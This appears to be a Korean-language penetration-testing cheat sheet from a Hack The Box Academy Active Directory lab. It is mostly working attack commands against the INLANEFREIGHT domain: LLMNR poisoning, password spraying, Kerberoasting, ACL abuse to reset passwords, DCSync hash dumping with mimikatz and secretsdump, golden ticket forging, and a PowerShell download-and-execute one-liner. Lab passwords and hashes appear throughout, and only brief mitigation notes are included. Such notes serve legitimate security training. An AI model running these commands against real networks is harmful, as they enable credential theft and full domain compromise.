## fping
- 단순히 호스트가 살아있는지만 확인하는데 있어서 `nmap`보다 ping만으로 확인하는 `fping`이 나을 수 있다.
```bash
fping -asgq 172.16.5.0/23
#      -a  : alive 호스트만 출력
#      -s  : 마지막에 통계 요약 출력
#      -g  : CIDR 입력 시 IP 목록 자동 생성
#      -q  : 개별 ICMP 결과 숨김 (조용히)
```

## Nmap
```bash
sudo nmap -v -A -iL hosts.txt -oA /home/htb-student/Documents/host-enum
```

## LLMNR/NBT-NS Poisoning
- DNS 실패 시 브로드캐스트로 물어보는 특성을 이용해서 중간에서 가짜 응답을 날리는 공격
- NTLMv2 해시 획득이 크랙 or NTLM Relay 공격으로 이어짐

### MITM
```bash
sudo responder -I tun0 -v
```
```powershell
# Not updated
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
```
.\Inveigh.exe
Press ESC -> C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> STOP
```

### 예방법
- Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."
- Control Panel → Network and Sharing Center → Change adapter settings → 어댑터 우클릭 → Properties → Internet Protocol Version 4 (TCP/IPv4) → Properties → Advanced → WINS 탭 → Disable NetBIOS over TCP/IP
- `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` 값 모니터링(1이 활성화 상태)
- SMB 서명 강제 적용 (Relay 공격 방어)
- 네트워크 접근 제어 (NAC) : 물리 장비 혹은 소프트웨어로 해당 네트워크에 접속하기 위한 인증서를 요구하는 시스템 구축.

#### LLMNR/NBT-NS 완전 비활성화 (GPO로 설정)
1. 스크립트 준비.(\\\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts 경로 저장)
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { 
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

2. Local Group Policy Editor 설정
Computer Configuration → Windows Settings → Script (Startup/Shutdown) → Startup 더블클릭
→ PowerShell Scripts 탭 선택 → Run Windows PowerShell scripts first 선택→ Add → 스크립트 경로(UNC path) 입력

3. 도메인 전체 배포 (Domain Controller)
Group Policy Management → GPO 생성 → 특정 OU에 적용 → 스크립트는 SYSVOL share의 UNC path로 호출

4. 적용 완료
대상 호스트 재부팅 or 네트워크 어댑터 재시작 → 다음 부팅 시 스크립트 실행 → NBT-NS 비활성화

## Password Policy
### Linux
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
```
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```
```bash
enum4linux -P 172.16.5.5

enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Windows
```powershell
net accounts
```
```powershell
import-module .\PowerView.ps1

Get-DomainPolicy
```

## Enumerate Users
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
```
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers

rpcclient $> queryuser 0x457
```
```bash
crackmapexec smb 172.16.5.5 --users

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
```bash
sudo git clone https://github.com/ropnop/kerbrute.git

make help

sudo make all

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

## Spraying
### Linux
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Windows
```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### 예방법
- 다중 인증(MFA) — 모바일 푸시, OTP, RSA 키 등을 활용해 비밀번호가 유출돼도 계정 접근을 차단
- 접근 제한 — 최소 권한 원칙에 따라 실제로 필요한 사용자에게만 애플리케이션 접근 허용
- 피해 최소화 — 관리자 계정 분리, 권한 세분화, 네트워크 분리(세그멘테이션)로 침해 범위 제한
- 비밀번호 위생 — 패스프레이즈 사용 권장, 사전 단어·계절·회사명 등 흔한 조합 필터링으로 추측 어렵게 만들기


## Enumerate
### Linux
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```

### Windows
```powershell
Import-Module ActiveDirectory

Get-Module

Get-ADDomain

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

Get-ADTrust -Filter *

Get-ADGroup -Filter * | select name

Get-ADGroup -Identity "Backup Operators"

Get-ADGroupMember -Identity "Backup Operators"
```
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
```powershell
.\SharpView.exe Get-DomainUser -Identity forend
```
```powershell
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```
```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

## impacket
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

## Living Off the Land
```powershell
hostname

[System.Environment]::OSVersion.Version

wmic qfe get Caption,Description,HotFixID,InstalledOn

wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

ipconfig /all

set

echo %USERDOMAIN%

echo %logonserver%

systeminfo

sc query windefend
```
```powershell
Get-Module

Get-ExecutionPolicy -List

Set-ExecutionPolicy Bypass -Scope Process

Get-ChildItem Env: | ft Key,Value

Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"

powershell.exe -version 2

netsh advfirewall show allprofiles

Get-MpComputerStatus

qwinsta

arp -a

route print
```
```powershell
net group /domain

net user /domain wrouse

net1 user

net localgroup administrators
```
```powershell
dsquery user

dsquery computer

dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr distinguishedName userAccountControl,description
```

## Kerberoasting
### Linux
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

### Windows
#### Manual
```
setspn.exe -Q */*

Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

mimikatz # base64 /out:true

mimikatz # kerberos::list /export
```
```bash
echo "<base64 blob>" |  tr -d \\n

cat encoded_file | base64 -d > sqldev.kirbi

python2.7 kirbi2john.py sqldev.kirbi

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

#### Newer
```powershell
Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname

Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
```powershell
.\Rubeus.exe kerberoast /stats

.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## Enumerating ACLs
```powershell
Import-Module .\PowerView.ps1

$sid = Convert-NameToSid wley

Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
```powershell
# New Session
Import-Module .\PowerView.ps1

$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

$sid2 = Convert-NameToSid damundsen

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

$itgroupsid = Convert-NameToSid "Information Technology"

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

$adunnsid = Convert-NameToSid adunn

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```
```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

## Abuse ACLs
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Import-Module .\PowerView.ps1

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

.\Rubeus.exe kerberoast /user:adunn /nowrap
```
```
# Clean up
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

## DCSync
```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
```
runas /netonly /user:INLANEFREIGHT\adunn powershell

.\mimikatz.exe

mimikatz # privilege::debug

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

### Reversible Encryption
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## RDP
### WINRM
```powershell
import-module .\powerview.ps1

Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```
```bash
evil-winrm -i 10.129.201.234 -u forend
```

### SQL Server Admin
```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
```powershell
Import-Module .\PowerUpSQL.ps1

Get-SQLInstanceDomain

Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```
```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

SQL> enable_xp_cmdshell
```

## Double Hop Problem
```powershell
# WINRM
import-module .\powerview.ps1

$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

get-domainuser -spn -credential $Cred | select samaccountname

klist
```
```powershell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

restart-service winrm

Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```

## Trust
```powershell
Import-Module activedirectory

Get-ADTrust -Filter *
```
```powershell
import-module .\powerview.ps1

Get-DomainTrust

Get-DomainTrustMapping

Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
```powershell
netdom query /domain:inlanefreight.local trust

netdom query /domain:inlanefreight.local dc

netdom query /domain:inlanefreight.local workstation
```

## Golden Ticket
```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
```
Import-Module .\powerview.ps1

Get-DomainSID

Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

klist

ls \\academy-ea-dc01.inlanefreight.local\c$
```
```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
